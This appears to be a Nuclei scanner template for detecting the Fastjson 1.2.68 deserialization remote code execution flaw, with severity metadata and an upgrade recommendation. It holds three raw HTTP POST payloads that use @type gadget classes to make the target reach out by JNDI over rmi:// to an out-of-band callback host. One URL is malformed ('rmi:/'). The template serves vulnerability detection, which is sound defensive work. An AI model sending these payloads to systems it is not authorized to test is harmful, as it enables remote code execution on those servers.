id: fastjson-1-2-68-rce
info:
  name: Fastjson 1.2.68 - Remote Code Execution
  author: zh
  severity: critical
  description: Fastjson 1.2.68 has a vulnerability that allows for remote execution
    of malicious code through deserialization.
  reference:
  - https://github.com/tdtc7/qps/tree/4042cf76a969ccded5b30f0669f67c9e58d1cfd2/Fastjson
  - https://github.com/wyzxxz/fastjson_rce_tool
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cwe-id: CWE-77
  tags: fastjson,rce,deserialization,oast
  metadata:
    impact: The Fastjson 1.2.68 remote code execution vulnerability has significant
      impact on the security of systems using this software.
    recommendation: I strongly recommend upgrading to a newer version of Fastjson
      to mitigate the risk of the deserialization remote code execution vulnerability.
requests:
- raw:
  - "POST / HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\n\n{\n  \
    \ \"@type\":\"org.apache.shiro.jndi.JndiObjectFactory\",\n   \"resourceName\"\
    :\"rmi://{{interactsh-url}}/Exploit\"\n}\n"
  - "POST / HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\n\n{\n  \
    \ \"@type\":\"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\",\n   \"jndiNames\"\
    :\"rmi://{{interactsh-url}}/Exploit\"\n}\n"
  - "POST / HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\n\n{\n  \
    \ \"@type\":\"br.com.anteros.dbcp.AnterosDBCPConfig\",\n   \"metricRegistry\"\
    :\"rmi:/{{interactsh-url}}/Exploit\"\n}\n"
  stop-at-first-match: true
  matchers-condition: and
  matchers:
  - type: word
    part: interactsh_protocol
    words:
    - dns
  - type: status
    negative: true
    status:
    - 200
